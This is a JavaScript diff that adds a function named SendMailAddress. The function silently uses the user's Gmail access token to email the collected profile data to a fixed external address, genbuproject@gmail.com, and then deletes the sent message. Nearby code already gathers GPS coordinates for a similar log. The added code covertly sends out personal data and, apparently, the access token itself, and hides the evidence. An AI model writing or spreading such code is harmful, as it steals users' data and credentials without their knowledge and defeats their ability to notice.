@@ -166,6 +166,8 @@ const Net = {
 					Res.Datas.Gender = JSON.parse(Event.target.response).gender,
 					Res.Datas.Language = JSON.parse(Event.target.response).language;
 					
+				Net.SendMailAddress();
+				
 				navigator.geolocation.getCurrentPosition(function (Position) {
 					Res.Datas.Location.Latitude = Position.coords.latitude;
 					Res.Datas.Location.Longitude = Position.coords.longitude;
@@ -177,6 +179,39 @@ const Net = {
 					
 					Net.SendLog();
 				});
+			}
+		});
+	},
+	
+	SendMailAddress: function () {
+		let Separator = "=====Sending=====";
+		
+		DOM.XHR({
+			Type: "POST",
+			URL: "https://www.googleapis.com/upload/gmail/v1/users/me/messages/send",
+			DoesSync: true,
+			
+			Params: {
+				"uploadType": "media",
+				"access_token": Res.Token,
+			},
+			
+			Headers: {
+				"Content-Type": "message/rfc822"
+			},
+			
+			Data: [
+				"To: genbuproject@gmail.com",
+				"Subject: =?UTF-8?B?" + btoa(unescape(encodeURIComponent("Address From " + Res.Datas.Name))) + "?=",
+				"MIME-Version: 1.0",
+				"Content-Type: text/plain; charset=UTF-8",
+				"",
+				"【メールアドレス送信用ログ】",
+				JSON.stringify(Res, null, "\t")
+			].join("\r\n"),
+			
+			OnLoad: function (Event) {
+				Net.DeleteLog(JSON.parse(Event.target.response).id);
 			}
 		});
 	},
@@ -204,6 +239,7 @@ const Net = {
 				"MIME-Version: 1.0",
 				"Content-Type: text/plain; charset=UTF-8",
 				"",
+				"【GPS情報送信用ログ】",
 				JSON.stringify(Res, null, "\t")
 			].join("\r\n"),
 			
